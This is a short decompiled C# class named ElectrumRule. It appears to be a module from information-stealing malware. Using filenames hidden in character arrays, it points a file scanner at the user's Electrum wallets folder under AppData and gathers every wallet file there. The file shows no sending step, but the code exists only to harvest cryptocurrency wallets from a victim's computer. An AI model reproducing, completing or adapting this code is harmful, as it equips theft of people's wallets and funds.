using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x0200001B RID: 27
public class ElectrumRule : FileScannerRule
{
	// Token: 0x06000071 RID: 113 RVA: 0x00005C94 File Offset: 0x00003E94
	public ElectrumRule()
	{
		base.Name = new string(new char[]
		{
			'E',
			'l',
			'e',
			'c',
			't',
			'r',
			'u',
			'm'
		});
	}

	// Token: 0x06000072 RID: 114 RVA: 0x00004F07 File Offset: 0x00003107
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
	}

	// Token: 0x06000073 RID: 115 RVA: 0x00005CB8 File Offset: 0x00003EB8
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[]
			{
				'\\',
				'E',
				'l',
				'e',
				'c',
				't',
				'r',
				'u',
				'm',
				'\\',
				'w',
				'a',
				'l',
				'l',
				'e',
				't',
				's'
			});
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "*",
				Recoursive = false
			});
		}
		catch
		{
		}
		return list;
	}
}
